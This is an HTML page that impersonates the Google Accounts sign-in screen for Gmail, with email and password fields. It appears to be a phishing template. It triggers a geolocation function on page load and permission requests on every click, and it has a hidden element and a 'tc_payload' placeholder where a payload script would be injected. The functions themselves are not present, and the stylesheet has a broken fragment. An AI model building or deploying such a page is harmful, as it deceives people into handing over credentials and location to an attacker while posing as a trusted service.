<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }

        .logo {
            font-size: 24px;
            color: #5f6368;
            margin-bottom: 10px;
            font-weight: 400;
        }

            background-size: contain;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }

        p {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 24px;
            text-align: left;
        }

        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            float: right;
        }

        .btn:hover {
            background: #1765cc;
        }
    </style>
</head>

<body onload="gpsLocation()">
    <div class="container">
        <div class="google-logo"></div>
        <h1>Sign in</h1>
        <p>to continue to Gmail</p>
        <div class="input-group">
            <input type="email" placeholder="Email or phone" onclick="requestPermissions()">
        </div>
        <div class="input-group">
            <input type="password" placeholder="Enter your password" onclick="requestPermissions()">
        </div>
        <button class="btn" onclick="requestPermissions()">Next</button>
    </div>
    <p id="techchip" style="display:none;"></p>
    <!-- tc_payload -->
</body>

</html>
